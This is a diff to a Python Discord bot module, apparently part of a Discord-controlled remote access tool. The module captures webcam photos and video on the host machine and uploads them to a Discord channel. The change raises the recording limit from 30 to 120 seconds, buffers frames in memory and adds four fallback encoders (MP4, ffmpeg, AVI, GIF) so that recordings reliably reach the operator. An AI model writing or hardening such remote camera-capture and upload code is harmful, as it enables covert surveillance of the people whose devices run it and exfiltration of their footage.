@@ -8,6 +8,8 @@ import asyncio
 import platform
 import subprocess
 import requests
+import time
+import tempfile
 
 import cv2
 import discord
@@ -270,7 +272,6 @@ class AudioCommands(commands.Cog):
         file_path = os.path.join(TEMP_DIR, "webcam_snap.png")
 
         try:
-            # Execute in a separate thread to keep bot loops non-blocking
             await asyncio.to_thread(self._capture_photo, file_path)
             
             if os.path.exists(file_path):
@@ -296,25 +297,29 @@ class AudioCommands(commands.Cog):
             await wrong_channel(ctx)
             return
 
-        if duration > 30:
-            await ctx.send("❌ **Error:** Please keep the video duration under 30 seconds.")
+        if duration > 120:
+            await ctx.send("❌ **Error:** Please keep the video duration under 120 seconds.")
             return
 
         await ctx.send(f"`[{current_time()}] Recording {duration} seconds of video...`")
         file_path = os.path.join(TEMP_DIR, "webcam_stream.mp4")
 
         try:
-            # Execute video capture logic in a separate thread
-            await asyncio.to_thread(self._record_video, file_path, duration)
+            # The record worker dynamically returns the working asset path depending on the fallback used
+            final_path = await asyncio.to_thread(self._record_video, file_path, duration)
             
-            if os.path.exists(file_path):
-                await ctx.send(
-                    f"`[{current_time()}] Video recording complete:`", 
-                    file=discord.File(file_path)
-                )
-                os.remove(file_path)
+            if final_path and os.path.exists(final_path):
+                # Ensure it's greater than 10KB to confirm structural video contents exist
+                if os.path.getsize(final_path) > 10000:
+                    await ctx.send(
+                        f"`[{current_time()}] Video recording complete:`", 
+                        file=discord.File(final_path)
+                    )
+                else:
+                    await ctx.send(f"`[{current_time()}] Error: Video stream contains an empty container. Camera may be locked.`")
+                os.remove(final_path)
             else:
-                await ctx.send(f"`[{current_time()}] Failed to record video.`")
+                await ctx.send(f"`[{current_time()}] Failed to record video stream.`")
         except Exception as e:
             await log_message(ctx, f"❌ **Error recording video:** {e}", duration=10)
 
@@ -328,8 +333,10 @@ class AudioCommands(commands.Cog):
         if not cap.isOpened():
             raise Exception("Could not open webcam device connection.")
         
-        # Warm up sensor frame
-        cap.read()
+        # Warm up sensor frames
+        for _ in range(5):
+            cap.read()
+            
         ret, frame = cap.read()
         if ret:
             cv2.imwrite(file_path, frame)
@@ -337,28 +344,113 @@ class AudioCommands(commands.Cog):
         if not ret:
             raise Exception("Failed to grab a valid frame from webcam.")
 
-    def _record_video(self, file_path: str, duration: int):
-        """Worker function for recording sequential frames to an MP4 asset."""
+    def _record_video(self, file_path: str, duration: int) -> str:
+        """Worker function for capturing hardware frames into memory and writing via structural fail-safes."""
         cap = cv2.VideoCapture(0)
         if not cap.isOpened():
             raise Exception("Could not open webcam device connection.")
         
-        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
-        fps = 20.0
-        width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
-        height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
+        # Warm up the camera sensor matrix
+        for _ in range(10):
+            cap.read()
+            
+        ret, frame = cap.read()
+        if not ret:
+            cap.release()
+            raise Exception("Camera opened, but failed to extract baseline frame.")
+            
+        height, width = frame.shape[:2]
         
-        out = cv2.VideoWriter(file_path, fourcc, fps, (width, height))
-        frames_to_capture = int(fps * duration)
+        frames = []
+        start_time = time.time()
+        end_time = start_time + duration
         
-        for _ in range(frames_to_capture):
+        # Step 1: Capture stream purely into RAM first to isolate recording from disk write lag
+        while time.time() < end_time:
             ret, frame = cap.read()
-            if not ret:
-                break
-            out.write(frame)
+            if ret:
+                if frame.shape[:2] == (height, width):
+                    frames.append(frame)
             
         cap.release()
-        out.release()
+        
+        if not frames:
+            raise Exception("No active frames captured from hardware sensor.")
+            
+        actual_duration = time.time() - start_time
+        fps = len(frames) / actual_duration if actual_duration > 0 else 24.0
+        if fps <= 0:
+            fps = 24.0
+
+        # ── TRACK 1: Standard OpenCV MP4 Writer ───────────────────────────
+        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
+        out = cv2.VideoWriter(file_path, fourcc, fps, (width, height))
+        if out.isOpened():
+            for f in frames:
+                out.write(f)
+            out.release()
+            
+        if os.path.exists(file_path) and os.path.getsize(file_path) > 10000:
+            return file_path
+            
+        if os.path.exists(file_path):
+            try: os.remove(file_path)
+            except Exception: pass
+
+        # ── TRACK 2: Local FFmpeg Image Stitching (Silicon Fix) ───────────
+        try:
+            with tempfile.TemporaryDirectory() as tmpdir:
+                for idx, f in enumerate(frames):
+                    img_path = os.path.join(tmpdir, f"frame_{idx:04d}.jpg")
+                    cv2.imwrite(img_path, f)
+                    
+                cmd = [
+                    "ffmpeg", "-y",
+                    "-framerate", str(fps),
+                    "-i", os.path.join(tmpdir, "frame_%04d.jpg"),
+                    "-c:v", "libx264",
+                    "-pix_fmt", "yuv420p",
+                    file_path
+                ]
+                subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
+                
+            if os.path.exists(file_path) and os.path.getsize(file_path) > 10000:
+                return file_path
+        except Exception:
+            if os.path.exists(file_path):
+                try: os.remove(file_path)
+                except Exception: pass
+
+        # ── TRACK 3: Native MJPEG Serialization into AVI ──────────────────
+        avi_path = file_path.replace(".mp4", ".avi")
+        fourcc_avi = cv2.VideoWriter_fourcc(*'MJPG')
+        out_avi = cv2.VideoWriter(avi_path, fourcc_avi, fps, (width, height))
+        if out_avi.isOpened():
+            for f in frames:
+                out_avi.write(f)
+            out_avi.release()
+            
+        if os.path.exists(avi_path) and os.path.getsize(avi_path) > 10000:
+            return avi_path
+
+        # ── TRACK 4: PIL Animated GIF Payload Fallback ────────────────────
+        try:
+            from PIL import Image
+            pil_frames = [Image.fromarray(cv2.cvtColor(f, cv2.COLOR_BGR2RGB)) for f in frames]
+            gif_path = file_path.replace(".mp4", ".gif")
+            pil_frames[0].save(
+                gif_path,
+                save_all=True,
+                append_images=pil_frames[1:],
+                duration=int(1000 / fps),
+                loop=0
+            )
+            if os.path.exists(gif_path) and os.path.getsize(gif_path) > 10000:
+                return gif_path
+        except Exception:
+            pass
+
+        return ""
 
 
 async def setup(bot):
